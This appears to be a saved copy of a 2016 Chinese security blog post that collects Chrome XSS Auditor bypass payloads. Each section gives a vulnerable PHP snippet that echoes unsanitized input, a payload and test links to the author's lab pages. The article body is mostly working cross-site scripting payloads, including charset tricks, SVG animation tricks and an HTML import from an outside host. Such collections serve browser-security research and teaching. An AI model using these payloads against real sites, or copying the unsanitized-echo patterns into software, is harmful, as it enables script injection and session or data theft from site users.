@@ -1,0 +1,368 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>浏览器安全一 / Chrome XSS Auditor bypass | 离别歌</title>
+<link href="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/styles.css" rel="stylesheet"/>
+<link href="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/style.css" rel="stylesheet"/>
+<link href="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/jquery.min.js"></script>
+<link href="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/code.css" rel="stylesheet"/>
+<link href="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/button.css" rel="stylesheet"/>
+<link href="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html&amp;text=%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E4%B8%80%20/%20Chrome%20XSS%20Auditor%20bypass"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html&amp;title=%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E4%B8%80%20/%20Chrome%20XSS%20Auditor%20bypass"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html&amp;is_video=false&amp;description=%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E4%B8%80%20/%20Chrome%20XSS%20Auditor%20bypass"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E4%B8%80%20/%20Chrome%20XSS%20Auditor%20bypass&amp;body=Check out this article: https%3A//www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html&amp;title=%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E4%B8%80%20/%20Chrome%20XSS%20Auditor%20bypass"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html&amp;title=%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E4%B8%80%20/%20Chrome%20XSS%20Auditor%20bypass"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html&amp;title=%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E4%B8%80%20/%20Chrome%20XSS%20Auditor%20bypass"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html&amp;title=%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E4%B8%80%20/%20Chrome%20XSS%20Auditor%20bypass"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html&amp;name=%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E4%B8%80%20/%20Chrome%20XSS%20Auditor%20bypass&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">浏览器安全一 / Chrome XSS Auditor bypass</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2016年1月16日 01:18" itemprop="datePublished">
+                    2016 一月 16 01:18
+                </time>
+</div>
+<div class="article-tag">
+            阅读：6715
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/HTML">web前端</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/fliter">fliter</a>,
+                
+                <a class="tag-link" href="/tag/%E6%B5%8F%E8%A7%88%E5%99%A8">浏览器</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>私藏比较久的干货，严禁转载。</p>
+<p>（2017-05-06 更新，chrome57更新了xss auditor的拦截方式，大量payload不能用了）</p>
+<h2 id="bypass-4-bypass"><a class="toclink" href="#bypass-4-bypass">Bypass 4 （需交互的bypass）</a></h2>
+<p>直到chrome 57可用。</p>
+<div class="codehilite"><pre><span></span>?c=<span class="nt">&lt;svg&gt;&lt;animate</span> <span class="na">href=</span><span class="s">#x</span> <span class="na">attributeName=</span><span class="s">href</span> <span class="na">values=</span><span class="s">&amp;#x3000;javascript:alert(1)</span> <span class="nt">/&gt;&lt;a</span> <span class="na">id=</span><span class="s">x</span><span class="nt">&gt;&lt;rect</span> <span class="na">width=</span><span class="s">100</span> <span class="na">height=</span><span class="s">100</span> <span class="nt">/&gt;&lt;/a&gt;</span>
+</pre></div>
+<p>test</p>
+<p><a href="http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Canimate%20href%3D%23x%20attributeName%3Dhref%20values%3D%26%23x3000%3Bjavascript%3Aalert(1)%20%2F%3E%3Ca%20id%3Dx%3E%3Crect%20width%3D100%20height%3D100%20%2F%3E%3C%2Fa%3E">http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Canimate%20href%3D%23x%20attributeName%3Dhref%20values%3D%26%23x3000%3Bjavascript%3Aalert(1)%20%2F%3E%3Ca%20id%3Dx%3E%3Crect%20width%3D100%20height%3D100%20%2F%3E%3C%2Fa%3E</a></p>
+<h2 id="bypass-3-via-flash"><a class="toclink" href="#bypass-3-via-flash">Bypass 3 via flash</a></h2>
+<p>只要支持flash的chrome版本（到Chrome 56），均可使用。<br>
+context == support flash</br></p>
+<div class="codehilite"><pre><span></span>&lt;object allowscriptaccess=always&gt; &lt;param name=url value=http://mhz.pw/game/xss/alert.swf&gt;
+</pre></div>
+<p>test</p>
+<p><a href="http://mhz.pw/game/xss/xss.php?xss=%3Cobject%20allowscriptaccess=always%3E%20%3Cparam%20name=url%20value=http%3A%2F%2Fmhz.pw%2Fgame%2Fxss%2Falert.swf%3E"><a href="http://mhz.pw/game/xss/xss.php?xss=%3Cobject%20allowscriptaccess=always%3E%20%3Cparam%20name=url%20value=http%3A%2F%2Fmhz.pw%2Fgame%2Fxss%2Falert.swf%3E">http://mhz.pw/game/xss/xss.php?xss=%3Cobject%20allowscriptaccess=always%3E%20%3Cparam%20name=url%20value=http%3A%2F%2Fmhz.pw%2Fgame%2Fxss%2Falert.swf%3E</a></a></p>
+<h2 id="universal-bypass-2"><a class="toclink" href="#universal-bypass-2">Universal Bypass 2</a></h2>
+<p>到Chrome 55/56可用， 无任何条件，只要输出在页面中即可执行代码。<br>
+context == null</br></p>
+<div class="codehilite"><pre><span></span>?xss=<span class="nt">&lt;svg&gt;&lt;set</span> <span class="na">href=</span><span class="s">#script</span> <span class="na">attributeName=</span><span class="s">href</span> <span class="na">to=</span><span class="s">data:,alert(document.domain)</span> <span class="nt">/&gt;&lt;script</span> <span class="na">id=</span><span class="s">script</span> <span class="na">src=</span><span class="s">foo</span><span class="nt">&gt;&lt;/script&gt;</span>
+</pre></div>
+<p>test</p>
+<p><a href="http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Cset%20href%3D%23script%20attributeName%3Dhref%20to%3Ddata%3A%2Calert(document.domain)%20%2F%3E%3Cscript%20id%3Dscript%20src%3Dfoo%3E%3C%2Fscript%3E"><a href="http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Cset%20href%3D%23script%20attributeName%3Dhref%20to%3Ddata%3A%2Calert(document.domain)%20%2F%3E%3Cscript%20id%3Dscript%20src%3Dfoo%3E%3C%2Fscript%3E">http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Cset%20href%3D%23script%20attributeName%3Dhref%20to%3Ddata%3A%2Calert(document.domain)%20%2F%3E%3Cscript%20id%3Dscript%20src%3Dfoo%3E%3C%2Fscript%3E</a></a></p>
+<h2 id="universal-bypass-1"><a class="toclink" href="#universal-bypass-1">Universal Bypass 1</a></h2>
+<p>到Chrome 55/56可用，无任何条件，只要输出在页面中即可执行代码。<br/>
+context == null</p>
+<div class="codehilite"><pre><span></span>?xss=&lt;link rel="import" href="https:www.leavesongs.com/testxss"
+</pre></div>
+<p>test</p>
+<p><a href="http://mhz.pw/game/xss/xss.php?xss=%3Clink%20rel%3D%22import%22%20href%3D%22https%3Awww.leavesongs.com%2Ftestxss%22"><a href="http://mhz.pw/game/xss/xss.php?xss=%3Clink%20rel%3D%22import%22%20href%3D%22https%3Awww.leavesongs.com%2Ftestxss%22">http://mhz.pw/game/xss/xss.php?xss=%3Clink%20rel%3D%22import%22%20href%3D%22https%3Awww.leavesongs.com%2Ftestxss%22</a></a></p>
+<h2 id="chrome-4445"><a class="toclink" href="#chrome-4445">Chrome 44/45 + 属性中输出的情况</a></h2>
+<p><a href="https://code.google.com/p/chromium/issues/detail?id=526104"><a href="https://code.google.com/p/chromium/issues/detail?id=526104">https://code.google.com/p/chromium/issues/detail?id=526104</a></a><br/>
+chrome45+ fixed<br/>
+context:</p>
+<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+ <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>XSSAuditor bypass<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+ <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">value</span><span class="o">=</span><span class="s">"&lt;?php echo isset($_GET['input']) ? $_GET['input'] : 'use ?input=foo'?&gt;"</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span> 
+</pre></div>
+<p>payload：</p>
+<div class="codehilite"><pre><span></span>"&gt;<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">prompt</span><span class="p">(</span><span class="sr">/XSS/</span><span class="p">);</span><span class="mi">1</span><span class="o">%</span><span class="mi">02</span><span class="o">&lt;</span><span class="nx">script</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span> 
+</pre></div>
+<p>test<br/>
+<a href="http://mhz.pw/game/xss/attr.php?xss=%22%3E%3Cscript%3Eprompt(%2FXSS%2F)%3B1%2502%3Cscript%3C%2Fscript%3E"><a href="http://mhz.pw/game/xss/attr.php?xss=%22%3E%3Cscript%3Eprompt(%2FXSS%2F)%3B1%2502%3Cscript%3C%2Fscript%3E">http://mhz.pw/game/xss/attr.php?xss=%22%3E%3Cscript%3Eprompt(%2FXSS%2F)%3B1%2502%3Cscript%3C%2Fscript%3E</a></a></p>
+<h2 id="charset-bypass"><a class="toclink" href="#charset-bypass">无charset Bypass</a></h2>
+<p>没有输出charset的情况下，可以通过制定字符集来绕过auditor。<br/>
+老版的这个编码：ISO-2022-KR，可用 <code>onerror%0f=alert(1)</code> bypass，但现在版本已经没用这个编码，所以该payload只适用于老版本chrome。<br/>
+新版中，有这个编码：ISO-2022-JP，可以在关键处中加入<code>%1B%28B</code>，会被省略。</p>
+<p>context:</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xss'</span><span class="p">];</span> 
+</pre></div>
+<p>payload:</p>
+<div class="codehilite"><pre><span></span>老版：
+xss=%3Cmeta%20charset=ISO-2022-JP%3E%3Csvg%20onload%0f=alert(1)%3E
+
+新版：
+xss=%3Cmeta%20charset=ISO-2022-JP%3E%3Csvg%20onload%1B%28B=alert(1)%3E
+</pre></div>
+<p>test:<br/>
+<a href="http://mhz.pw/game/xss/charset.php?xss=%3Cmeta%20charset=ISO-2022-JP%3E%3Csvg%20onload%1B%28B=alert(1)%3E"><a href="http://mhz.pw/game/xss/charset.php?xss=%3Cmeta%20charset=ISO-2022-JP%3E%3Csvg%20onload%1B%28B=alert(1)%3E">http://mhz.pw/game/xss/charset.php?xss=%3Cmeta%20charset=ISO-2022-JP%3E%3Csvg%20onload%1B%28B=alert(1)%3E</a></a></p>
+<h2 id="script"><a class="toclink" href="#script">输出在属性中，并且后面还有<code>&lt;script&gt;</code>的情况</a></h2>
+<p>context:</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;!doctype HTML&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">alt=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xss'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;script&gt;</span> y = "abc"; <span class="nt">&lt;/script&gt;</span> 
+</pre></div>
+<p>payload</p>
+<div class="codehilite"><pre><span></span><span class="nt">&lt;code&gt;</span>xss="&gt;<span class="nt">&lt;script</span><span class="err">/</span><span class="na">src=</span><span class="s">data:,alert(1)%2b"</span>
+<span class="na">xss=</span><span class="s">%22%3E%3Cscript/src=data:,alert(document.domain)%2b%22</span>
+<span class="na">xss=</span><span class="s">%22%3E%3Cscript/src=data:,alert(1)%2b%22</span>
+<span class="na">xss=</span><span class="s">%22%3E%3Cscript/src=data:,alert(1)%26sol;%26sol;&lt;/code</span><span class="nt">&gt;</span> 
+</pre></div>
+<p>test<br/>
+<a href="http://mhz.pw/game/xss/beforescript.php?xss=%22%3E%3Cscript%2Fsrc%3Ddata%3A%2Calert(document.domain)%2B%22"><a href="http://mhz.pw/game/xss/beforescript.php?xss=%22%3E%3Cscript%2Fsrc%3Ddata%3A%2Calert(document.domain)%2B%22">http://mhz.pw/game/xss/beforescript.php?xss=%22%3E%3Cscript%2Fsrc%3Ddata%3A%2Calert(document.domain)%2B%22</a></a></p>
+<h2 id="_1"><a class="toclink" href="#_1">双输出点的情况</a></h2>
+<p>context:</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span> 
+<span class="c1">// Echo the value of parameter one </span>
+<span class="k">echo</span> <span class="s2">"This is text1:"</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'text1'</span><span class="p">]</span><span class="o">.</span><span class="s2">"&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span> 
+<span class="c1">// Echo the value of parameter two </span>
+<span class="k">echo</span> <span class="s2">"This is text2:"</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'text2'</span><span class="p">]</span><span class="o">.</span><span class="s2">"&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span> 
+<span class="cp">?&gt;</span> 
+</pre></div>
+<p>payload:</p>
+<div class="codehilite"><pre><span></span>http://xxx/chrome.php?text1=<span class="nt">&lt;script&gt;</span>alert(/XSS/);void('<span class="err">&amp;</span>text2=')<span class="nt">&lt;/script&gt;</span> 
+http://xxx/chrome.php?text1=<span class="nt">&lt;script&gt;</span>alert(/XSS/);document.write('<span class="err">&amp;</span>text2=')<span class="nt">&lt;/script&gt;</span>
+</pre></div>
+<p>test<br/>
+<a href="http://mhz.pw/game/xss/doubleout.php?text1=%3Cscript%3Ealert(/XSS/);void(%27&amp;text2=%27)%3C/script%3E"><a href="http://mhz.pw/game/xss/doubleout.php?text1=%3Cscript%3Ealert(/XSS/);void(%27&amp;text2=%27)%3C/script%3E">http://mhz.pw/game/xss/doubleout.php?text1=%3Cscript%3Ealert(/XSS/);void(%27&amp;text2=%27)%3C/script%3E</a></a></p>
+<h2 id="chrome-43-xssauditor-bypass"><a class="toclink" href="#chrome-43-xssauditor-bypass">Chrome 43 XSSAuditor bypass</a></h2>
+<p>大概2015-06-23以前的版本均可。<br/>
+context==全部情况<br/>
+payload:</p>
+<div class="codehilite"><pre><span></span>xss=<span class="nt">&lt;svg&gt;&lt;script&gt;</span>/<span class="nt">&lt;1/&gt;</span>alert(document.domain)<span class="nt">&lt;/script&gt;&lt;/svg&gt;</span>
+</pre></div>
+<p>test<br/>
+<a href="http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Cscript%3E/%3C1/%3Ealert(document.domain)%3C/script%3E%3C/svg%3E"><a href="http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Cscript%3E/%3C1/%3Ealert(document.domain)%3C/script%3E%3C/svg%3E">http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Cscript%3E/%3C1/%3Ealert(document.domain)%3C/script%3E%3C/svg%3E</a></a></p>
+<h2 id="chrome-3640-link-htmlbypass"><a class="toclink" href="#chrome-3640-link-htmlbypass">Chrome 36~40 link 导入html导致bypass</a></h2>
+<p>Fixed in Oct 10, 2014.（实际上15年初还存在）<br/>
+<a href="https://code.google.com/p/chromium/issues/detail?id=421166"><a href="https://code.google.com/p/chromium/issues/detail?id=421166">https://code.google.com/p/chromium/issues/detail?id=421166</a></a><br/>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-090304"><a href="http://www.wooyun.org/bugs/wooyun-2010-090304">http://www.wooyun.org/bugs/wooyun-2010-090304</a></a><br/>
+由于link导入外部html导致XSSAuditor绕过。<br/>
+context==全部情况</p>
+<p>payload</p>
+<div class="codehilite"><pre><span></span><span class="n">xss</span><span class="o">=&lt;</span><span class="n">link</span> <span class="n">rel</span><span class="o">=</span><span class="kn">import</span> <span class="nn">href</span><span class="o">=</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">auth</span><span class="o">.</span><span class="n">mhz</span><span class="o">.</span><span class="n">pw</span><span class="o">/</span><span class="n">game</span><span class="o">/</span><span class="n">xss</span><span class="o">/</span><span class="n">link</span><span class="o">.</span><span class="n">php</span><span class="o">&gt;</span>
+</pre></div>
+<p>test<br/>
+<a href="http://mhz.pw/game/xss/xss.php?xss=%3Clink%20rel%3Dimport%20href%3Dhttps%3A%2F%2Fauth.mhz.pw%2Fgame%2Fxss%2Flink.php%3E"><a href="http://mhz.pw/game/xss/xss.php?xss=%3Clink%20rel%3Dimport%20href%3Dhttps%3A%2F%2Fauth.mhz.pw%2Fgame%2Fxss%2Flink.php%3E">http://mhz.pw/game/xss/xss.php?xss=%3Clink%20rel%3Dimport%20href%3Dhttps%3A%2F%2Fauth.mhz.pw%2Fgame%2Fxss%2Flink.php%3E</a></a></p>
+<h2 id="script_1"><a class="toclink" href="#script_1">输出在script内字符串位置的情况</a></h2>
+<p>如果允许闭合字符串，直接闭合并写入javascript即可，如: <a href="http://mhz.pw/game/xss/scriptstr.php?xss=%27%7Calert(1)%7C%27"><a href="http://mhz.pw/game/xss/scriptstr.php?xss=%27|alert(1)|%27">http://mhz.pw/game/xss/scriptstr.php?xss=%27|alert(1)|%27</a></a><br/>
+但如果不能闭合单引号呢？如这个context</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>all<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/javascript"</span><span class="p">&gt;</span>
+    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="s1">'&lt;?php echo addslashes($_GET["xss"]); ?&gt;'</span><span class="p">;</span>
+    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+123
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span> 
+</pre></div>
+<p>payload</p>
+<div class="codehilite"><pre><span></span><span class="nt">&lt;script&gt;</span>
+x = "<span class="nt">&lt;/script&gt;&lt;svg&gt;&lt;script&gt;</span>alert(1)+<span class="ni">&amp;quot;</span>";
+
+<span class="nt">&lt;script&gt;</span>
+x = "<span class="nt">&lt;/script&gt;&lt;svg&gt;&lt;script&gt;</span>alert(1)+<span class="ni">&amp;apos;</span>";
+</pre></div>
+<p>test<br/>
+<a href="http://mhz.pw/game/xss/scriptaddslashes.php?xss=%3C/script%3E%3Csvg%3E%3Cscript%3Ealert(1)%2b%26apos%3B"><a href="http://mhz.pw/game/xss/scriptaddslashes.php?xss=%3C/script%3E%3Csvg%3E%3Cscript%3Ealert(1)%2b%26apos%3B">http://mhz.pw/game/xss/scriptaddslashes.php?xss=%3C/script%3E%3Csvg%3E%3Cscript%3Ealert(1)%2b%26apos%3B</a></a><br/>
+<a href="http://mhz.pw/game/xss/scriptaddslashes.php?xss=%3C/script%3E%3Csvg%3E%3Cscript%3Ealert(1)/"><a href="http://mhz.pw/game/xss/scriptaddslashes.php?xss=%3C/script%3E%3Csvg%3E%3Cscript%3Ealert(1)//">http://mhz.pw/game/xss/scriptaddslashes.php?xss=%3C/script%3E%3Csvg%3E%3Cscript%3Ealert(1)//</a></a></p>
+<h2 id="bypass"><a class="toclink" href="#bypass">有可控上传点的通用Bypass</a></h2>
+<p>context：<br/>
+网站域名下有可控的上传点，我可以上传一个.txt或.js等文件（只要不是媒体文件，其他文件均可，比如上传是黑名单验证的，可以随便写个后缀）。再引入script标签的src属性即可。</p>
+<p>payload</p>
+<div class="codehilite"><pre><span></span>xss=%3Cscript%20src=/game/xss/upload/upload.txt%3E%3C/script%3E
+</pre></div>
+<p>test<br/>
+<a href="http://mhz.pw/game/xss/xss.php?xss=%3Cscript%20src=/game/xss/upload/upload.txt%3E%3C/script%3E"><a href="http://mhz.pw/game/xss/xss.php?xss=%3Cscript%20src=/game/xss/upload/upload.txt%3E%3C/script%3E">http://mhz.pw/game/xss/xss.php?xss=%3Cscript%20src=/game/xss/upload/upload.txt%3E%3C/script%3E</a></a></p>
+<p><a href="http://mhz.pw/game/xss/xss.php?xss=%3Cscript%20src=/game/xss/upload/upload.ayu%3E%3C/script%3E"><a href="http://mhz.pw/game/xss/xss.php?xss=%3Cscript%20src=/game/xss/upload/upload.ayu%3E%3C/script%3E">http://mhz.pw/game/xss/xss.php?xss=%3Cscript%20src=/game/xss/upload/upload.ayu%3E%3C/script%3E</a></a></p>
+<h2 id="json-encode"><a class="toclink" href="#json-encode">JSON Encode</a></h2>
+<p>context</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x'</span><span class="p">])</span><span class="cp">?&gt;</span>
+</pre></div>
+<p>payload</p>
+<div class="codehilite"><pre><span></span>?x=&lt;img+src=x+onerror=`ö`-alert(1)&gt;
+</pre></div>
+<h2 id="_2"><a class="toclink" href="#_2">存在字符替换的情况</a></h2>
+<p>当输出点在输出前存在字符（大部分字符，字符串什么的都可以）的替换，context如下：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'"'</span><span class="p">,</span> <span class="s1">'&amp;quote;'</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]);</span>
+<span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'&amp;'</span><span class="p">,</span> <span class="s1">'&amp;amp;'</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]);</span>
+<span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'&amp;bsol;'</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]);</span>
+<span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'#'</span><span class="p">,</span> <span class="s1">'&amp;num;'</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]);</span>
+<span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'xxxx'</span><span class="p">,</span> <span class="s1">'b'</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]);</span>
+</pre></div>
+<p>既可以在payload里带入该字符进行绕过auditor：</p>
+<div class="codehilite"><pre><span></span>xss=<span class="nt">&lt;script&gt;</span>'"'/alert(1)<span class="nt">&lt;/script&gt;</span>
+</pre></div>
+<p>test<br/>
+<a href="http://mhz.pw/game/xss/amps.php?name=zx%3Cscript%3E%27%26%27/alert(1)%3C/script%3Eczxc"><a href="http://mhz.pw/game/xss/amps.php?name=zx%3Cscript%3E%27%26%27/alert(1)%3C/script%3Eczxc">http://mhz.pw/game/xss/amps.php?name=zx%3Cscript%3E%27%26%27/alert(1)%3C/script%3Eczxc</a></a></p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2504">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/be55e2cad8372820515e85821b3f34e7.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">lzw</a>
+<time datetime="2017年1月6日 01:14" itemprop="datePublished">
+                            2017 一月 06 01:14
+                        </time>
+<a href="javascript:reply_to('2504', 'lzw')">回复</a>
+</p>
